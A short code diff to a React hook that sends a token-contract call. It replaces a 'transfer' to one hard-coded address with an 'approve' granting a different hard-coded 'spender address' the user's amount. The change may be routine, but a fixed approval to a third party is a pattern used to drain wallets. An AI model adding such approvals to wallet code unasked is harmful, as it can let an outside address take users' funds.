@@ -14,9 +14,9 @@ const UseWriteContract = () => {
       const tx = writeContract({
         abi,
         address: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
-        functionName: "transfer",
+        functionName: "approve",
         args: [
-          "0x3426D106f5de9ac55cCA854BecEd616951360596",
+          "0xe75dF01B6D687be68FfC3A15E10a21aCba0fc199", // the spender address
           result.data.value, //bigInt
         ],
       });
